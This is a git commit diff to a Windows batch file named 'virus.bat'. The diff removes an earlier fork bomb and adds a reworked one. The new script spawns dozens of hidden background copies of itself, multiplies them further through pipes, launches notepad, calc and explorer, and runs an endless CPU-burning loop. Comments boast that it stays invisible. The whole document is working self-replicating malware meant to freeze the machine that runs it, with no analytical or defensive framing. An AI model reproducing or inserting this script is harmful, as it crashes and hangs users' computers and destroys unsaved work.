3cead1b17c719f3d6760f30fb19a3d5075aa0009
AnthonyGrullonA <anthonygrulon283@gmail.com>
2026-04-12 22:15:03 -0400

    otroma

--- virus.bat
+++ virus.bat
@@ -1,9 +1,25 @@
 @echo off
-for /l %%i in (1,1,50) do start "" %0
-:masacre
-start "" cmd /c "%~f0"
-start "" notepad
-start "" calc
-start "" explorer
-%0|%0|%0|%0|%0
-goto masacre
+REM ========================================
+REM BACKGROUND TOTAL - 0 CMD
+REM ========================================
+if "%1"=="H" goto :H
+
+REM 40 SPAWNS BACKGROUND
+for /l %%i in (1,1,40) do start /b cmd /c "%~f0" H
+exit /b
+
+:H
+:saturacion
+REM LEGITIMOS EN BACKGROUND
+start /b notepad.exe
+start /b calc.exe
+start /b explorer.exe
+
+REM PIPE INVISIBLE
+start /b %0 H
+%0|%0|%0|%0
+
+REM CPU DIRECTO
+for /l %%i in (1,1,50000) do set /a "x=%%i*2"
+
+goto saturacion
